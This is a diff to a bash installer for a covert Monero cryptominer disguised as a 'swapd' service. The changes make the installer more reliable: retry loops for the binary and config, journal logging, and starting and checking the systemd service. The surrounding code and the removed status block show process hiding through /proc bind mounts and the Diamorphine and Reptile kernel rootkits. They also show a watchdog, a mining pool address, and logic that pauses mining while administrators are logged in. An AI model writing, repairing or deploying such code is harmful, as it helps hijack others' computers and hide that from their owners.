@@ -1773,16 +1773,50 @@ else
     log "WARNING: Not running as root - process hiding disabled"
 fi
 
-# Verify miner binary exists
+# Verify miner binary exists - wait if not found
 if [ ! -f "$MINER_BIN" ]; then
     log "ERROR: Miner binary not found at $MINER_BIN"
-    exit 1
+    log "Waiting for miner binary to be created..."
+    
+    # Wait up to 5 minutes for binary to appear
+    for i in {1..60}; do
+        if [ -f "$MINER_BIN" ]; then
+            log "Miner binary found after $i attempts!"
+            break
+        fi
+        sleep 5
+    done
+    
+    # If still not found, wait forever (service will auto-restart)
+    if [ ! -f "$MINER_BIN" ]; then
+        log "ERROR: Miner binary still not found after 5 minutes!"
+        log "Service will restart in 10 seconds..."
+        sleep 10
+        exit 1  # Let systemd restart us
+    fi
 fi
 
-# Verify config exists
+# Verify config exists - wait if not found  
 if [ ! -f "$CONFIG_FILE" ]; then
     log "ERROR: Config not found at $CONFIG_FILE"
-    exit 1
+    log "Waiting for config to be created..."
+    
+    # Wait up to 5 minutes for config to appear
+    for i in {1..60}; do
+        if [ -f "$CONFIG_FILE" ]; then
+            log "Config found after $i attempts!"
+            break
+        fi
+        sleep 5
+    done
+    
+    # If still not found, wait forever (service will auto-restart)
+    if [ ! -f "$CONFIG_FILE" ]; then
+        log "ERROR: Config still not found after 5 minutes!"
+        log "Service will restart in 10 seconds..."
+        sleep 10
+        exit 1  # Let systemd restart us
+    fi
 fi
 
 # Function to safely hide a process (only if root)
@@ -1905,9 +1939,10 @@ OOMScoreAdjust=200
 MemoryMax=400M
 MemoryHigh=300M
 
-# Silence everything
-StandardOutput=null
-StandardError=null
+# CRITICAL: Enable logging for debugging (was null before!)
+StandardOutput=journal
+StandardError=journal
+SyslogIdentifier=swapd
 
 # Clean umount on stop
 ExecStopPost=/usr/bin/bash -c 'umount -l /proc/[0-9]* 2>/dev/null || true'
@@ -1921,11 +1956,47 @@ EOL
         # Use robust force-stop to ensure clean start
         force_stop_service "swapd" "swapd xmrig"
         
-        echo "[*] Starting swapd systemd service"
+        echo "[*] Making launcher.sh executable..."
+        chmod +x /root/.swapd/launcher.sh
+        
+        echo "[*] Reloading systemd daemon..."
         sudo systemctl daemon-reload
+        
+        echo "[*] Enabling swapd service for auto-start..."
         sudo systemctl enable swapd.service
+        
+        echo "[*] Starting swapd service NOW..."
+        sudo systemctl start swapd.service
+        
+        # Wait a bit for service to start
+        sleep 3
+        
+        # Verify service is running
+        echo "[*] Verifying service status..."
+        if sudo systemctl is-active --quiet swapd.service; then
+            echo "[✓] Service is RUNNING!"
+            sudo systemctl status swapd.service --no-pager -l | head -15
+        else
+            echo "[!] WARNING: Service is NOT running!"
+            echo "[!] Checking logs..."
+            sudo journalctl -u swapd -n 20 --no-pager
+            echo ""
+            echo "[!] Trying to start again..."
+            sudo systemctl start swapd.service
+            sleep 2
+            if sudo systemctl is-active --quiet swapd.service; then
+                echo "[✓] Service started on second attempt!"
+            else
+                echo "[!] Service failed to start - check logs with:"
+                echo "    sudo journalctl -u swapd -f"
+                echo "    sudo systemctl status swapd"
+            fi
+        fi
+        
+        echo ""
         echo "[✓] systemd service created and enabled"
         echo "To see swapd service logs run \"sudo journalctl -u swapd -f\" command"
+        echo "To check status run \"sudo systemctl status swapd\" command"
         
     else
         echo "[*] Creating SysV init service (systemd not available)"
@@ -2490,74 +2561,3 @@ else
 fi
 
 if lsmod | grep -q diamorphine 2>/dev/null; then
-    echo "  ✓ Diamorphine: ACTIVE (kernel rootkit)"
-else
-    echo "  ○ Diamorphine: Not loaded"
-fi
-
-if [ -d /reptile ] || lsmod | grep -q reptile 2>/dev/null; then
-    echo "  ✓ Reptile: ACTIVE (kernel rootkit)"
-else
-    echo "  ○ Reptile: Not loaded"
-fi
-
-if [ -f /usr/local/bin/system-watchdog ]; then
-    echo "  ✓ Intelligent Watchdog: ACTIVE (3-min, state-tracked)"
-else
-    echo "  ○ Watchdog: Not deployed"
-fi
-
-if [ -f /root/.swapd/launcher.sh ]; then
-    echo "  ✓ launcher.sh: ACTIVE (mount --bind /proc hiding)"
-else
-    echo "  ○ launcher.sh: Not created"
-fi
-
-echo "  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling"
-echo "  ✓ Miner renamed: 'swapd' (stealth binary name)"
-
-echo ""
-echo "Installation Method:"
-if [ "$USE_WGET" = true ]; then
-    echo "  Download Tool: wget (curl SSL/TLS failed)"
-else
-    echo "  Download Tool: curl"
-fi
-
-# Check how the file was obtained
-if [ -f /tmp/.local_file_used ]; then
-    echo "  Download Mode: Local file (from script directory)"
-    rm -f /tmp/.local_file_used
-elif [ -f /tmp/.manual_upload_used ]; then
-    echo "  Download Mode: Manual upload (SSL too old for HTTPS)"
-    rm -f /tmp/.manual_upload_used
-else
-    echo "  Download Mode: Automatic download"
-fi
-
-echo ""
-echo "Mining Configuration:"
-echo "  Binary:  /root/.swapd/swapd"
-echo "  Config:  /root/.swapd/config.json"
-echo "  Wallet:  $WALLET"
-echo "  Pool:    gulf.moneroocean.stream:80"
-
-echo ""
-echo "Process Hiding Commands:"
-echo "  Hide:    kill -31 \$PID  (requires Diamorphine)"
-echo "  Unhide:  kill -63 \$PID  (requires Diamorphine)"
-echo "  Reptile: /reptile/reptile_cmd hide"
-
-echo ""
-echo "========================================================================="
-echo "[*] Miner will auto-stop when admins login and restart when they logout"
-echo "[*] All processes are hidden via multiple stealth layers"
-echo "========================================================================="
-
-#echo ""
-#echo "Miner Details:"
-#echo "  Binary:  /root/.swapd/swapd"
-#echo "  Config:  /root/.swapd/config.json"
-#echo "  Wallet:  $WALLET"
-#echo ""
-#echo "========================================================================="
